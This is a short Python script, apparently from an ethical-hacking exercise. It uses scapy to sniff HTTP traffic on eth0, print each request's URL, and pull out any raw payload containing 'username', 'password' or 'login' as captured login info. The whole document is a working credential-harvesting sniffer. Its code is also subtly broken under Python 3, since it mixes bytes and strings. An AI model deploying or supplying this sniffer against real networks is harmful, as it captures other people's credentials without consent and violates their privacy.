import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):  # explalin
        load = packet[scapy.Raw].load
        keywords = ['username', 'password', 'login']
        for keyword in keywords:
            if keyword in load:
               return load
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("> HTTP Request URL is: " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("> Login info is: " + login_info)



sniff("eth0")
